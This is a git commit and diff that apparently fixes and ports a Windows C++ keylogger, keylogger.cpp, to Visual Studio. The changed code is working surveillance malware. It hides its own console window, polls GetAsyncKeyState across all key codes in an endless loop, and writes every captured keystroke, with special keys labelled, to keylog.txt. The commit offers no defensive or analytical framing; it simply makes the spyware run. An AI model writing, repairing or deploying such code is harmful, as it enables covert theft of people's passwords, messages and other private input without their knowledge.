3b8b5731711e5cfccf7e9accd40aec47833c6a60
Aime Cesaire <mu.aimecesaire@gmail.com>
2023-12-14 01:09:01 -0500

    Running Code
    Ported it to Visual Studio

--- keylogger.cpp
+++ keylogger.cpp
@@ -1,9 +1,8 @@
-#include <iostream>
-#include<map>
 #include <fstream>
-#include <Windows.h>
+#include <iostream>
+#include <map>
 #include <string>
-#include <bits/stdc++.h>
+#include <Windows.h>
 
 using namespace std;
 #define LOG_FILE "keylog.txt"
@@ -19,29 +18,34 @@ void saveData(string data) {
 }
 
 int main() {
-    HWND hwnd = GetConsoleWindow();
-    ShowWindow(hwnd, SW_HIDE);
-std::map<int, std::string> specialKeys{
-        {result[VK_SPACE] = " "},
-        {result[VK_RETURN] = "\n"},
-        {result[VK_BACK] = "\b"},
-        {result[VK_TAB] = "[TAB]"},
-        {result[VK_SHIFT] = "[SHIFT]"},
-        {result[VK_CONTROL] = "[CTRL]"},
-        {result[VK_MENU] = "[ALT]"},
-        {result[VK_CAPITAL] = "[CAPS_LOCK]"}
+    HWND windowHandle = GetConsoleWindow();
+    ShowWindow(windowHandle, SW_HIDE);
+    map<int, string> specialKeys{
+            {VK_SPACE, " "},
+            {VK_RETURN, "\n"},
+            {VK_BACK, "\b"},
+            {VK_TAB, "[TAB]"},
+            {VK_SHIFT, "[SHIFT]"},
+            {VK_CONTROL, "[CTRL]"},
+            {VK_MENU, "[ALT]"},
+            {VK_CAPITAL, "[CAPS_LOCK]"}
     };
 
 
-    while () {
-        for (int i = 8; i <= 255; i++) {
-            if (GetAsyncKeyState(i) & 0x8001) {
-                if (find(specialKeys.begin(), specialKeys.end(), i) != specialKeys.end()) {
-                    saveData(specialKeys.at(i));
-                } else {
-                    saveData(char(i));
+    while (true) {
+        for (int key = 8; key <= 255; key++) {
+            if (GetAsyncKeyState(key) & 0x8001) {
+
+                auto it = specialKeys.find(key);
+                if (it != specialKeys.end()) {
+                    saveData(it->second);
+                }
+                else {
+                    saveData(string(1, (char)key));
                 }
             }
         }
-    
+
+    }
+	return 0;
 }
